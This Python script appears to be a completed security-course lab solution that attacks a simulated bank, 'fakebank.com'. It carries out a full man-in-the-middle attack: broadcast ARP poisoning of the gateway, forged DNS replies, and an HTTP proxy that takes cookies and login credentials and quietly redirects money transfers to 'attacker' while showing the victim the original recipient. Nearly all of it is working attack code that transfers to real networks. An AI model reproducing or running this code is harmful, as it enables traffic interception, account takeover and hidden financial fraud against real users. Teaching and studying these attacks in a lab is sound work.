import threading
import time
import http.server
import socketserver
from http.client import HTTPConnection
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, urlencode
from scapy.config import conf

import cs190
from scapy.all import (
    sniff,
    sendp,
    send,
    ARP,
    Ether,
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    get_if_hwaddr
)

FAKEBANK_DOMAIN = "fakebank.com"
FAKEBANK_REAL_IP = cs190.get_bank_ip()
MITM_IP = cs190.get_local_ip()
MITM_MAC = Ether().src
conf.iface = "eth0"
my_mac = get_if_hwaddr(conf.iface)

print(f"[MITM] MITM IP: {MITM_IP}, MAC: {MITM_MAC}", flush=True)
print(f"[MITM] Spoofing DNS for {FAKEBANK_DOMAIN} → {MITM_IP}", flush=True)
print(f"[MITM] Forwarding traffic to real bank → {FAKEBANK_REAL_IP}", flush=True)

# ========== TODO: ARP Poisoning ==========

def poison_arp():    
    arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=MITM_MAC) / ARP(
        op=2,
        psrc="10.38.8.2",
        hwsrc=MITM_MAC,
        pdst="255.255.255.255",
        hwdst="ff:ff:ff:ff:ff:ff"
    )

    while True:
        sendp(arp_reply, verbose=False)
        time.sleep(1)
    

# ========== TODO: DNS Spoofing ==========
def _dns_spoof(pkt):
    # TODO: Check if the DNS query is for fakebank.com
    if pkt and pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        website_query = pkt[DNSQR].qname.decode()
        if website_query == f"{FAKEBANK_DOMAIN}." and pkt[IP].dst == "10.38.8.2":
            print(f"[DNS] Spoofing response to {pkt[IP].src}:{pkt[UDP].sport} for {pkt[DNSQR].qname.decode()}", flush=True)
            # TODO: Craft and send a fake DNS reply with MITM_IP
            ether = Ether(dst=pkt[Ether].src)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            dns = DNS(qr=1, id=pkt[DNS].id, qd=pkt[DNS].qd, an=DNSRR(rrname=website_query, type=1, rdata=MITM_IP))
            sendp(ether / ip / udp / dns, verbose=False)

def spoof_dns():
    print("[DNS] Listening for DNS queries...", flush=True)
    sniff(filter="udp dst port 53", prn=_dns_spoof, store=0)

class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

class MITMHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    # ========== TODO: HTTP Proxy ==========
    def _handle(self):
        print(f"[HTTP] Client request: {self.command} {self.path}", flush=True)
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        
        # TODO: Steal any cookies sent by the client
        cookie_header = self.headers.get("Cookie", 0)
        if cookie_header:
            cookies = SimpleCookie()
            cookies.load(cookie_header)
            for key, value in cookies.items():
                cs190.steal_client_cookie(key, value.value)

        # TODO: Identify the request path (e.g., /login) using self.path
        if self.path == "/login":
            # TODO: On /login, extract and steal username password
            parsed_body = parse_qs(body)
            decoded_values = [v[0].decode() for v in parsed_body.values()]
            username = decoded_values[0]
            password = decoded_values[1]
            cs190.steal_credentials(username, password)
        
        saved_transfer_to = ""
        if self.path == "/transfer":
            # TODO: On /transfer, rewrite the "to=" field to "attacker"
            parsed_body = parse_qs(body)
            saved_transfer_to = parsed_body[b'to'][0].decode()
            parsed_body[b'to'] = [b'attacker']
            body = urlencode(parsed_body, doseq=True)

        # TODO: Forward request to real bank
        conn = HTTPConnection(FAKEBANK_REAL_IP, 80, timeout=10)
        conn.request(self.command, self.path, body=body, headers=self.headers)

        resp = conn.getresponse()
        resp_body = resp.read()

        if self.path == "/transfer":
            text_body = resp_body.decode('utf-8')
            parts = text_body.split(" TO ")
            before_to = parts[0]
            new_after_to = saved_transfer_to
            new = before_to + " TO " + new_after_to
            resp_body = new.encode('utf-8')

        # TODO: Steal any cookies set by the bank server
        bank_cookie_header = resp.headers.get("Set-Cookie", 0)
        if bank_cookie_header:
            bank_cookies = SimpleCookie()
            bank_cookies.load(bank_cookie_header)
            for key, value in bank_cookies.items():
                cs190.steal_server_cookie(key, value.value)

        # TODO: Relay the bank response to the client after any necessary processing 
        self.send_response(resp.status)

        for key, value in resp.headers.items():
            if key.lower() in ['server', 'date']:
                continue
            self.send_header(key, value)
    
        if 'Content-Length' not in resp.headers:
            self.send_header("Content-Length", str(len(resp_body)))

        self.end_headers()
        self.wfile.write(resp_body)

def proxy_http():
    print("[HTTP] MITM proxy listening on :80...", flush=True)
    with ThreadingHTTPServer(("", 80), MITMHandler) as server:
        server.serve_forever()

def main():
    threading.Thread(target=poison_arp, daemon=True).start()
    threading.Thread(target=spoof_dns, daemon=True).start()
    proxy_http()

if __name__ == "__main__":
    main()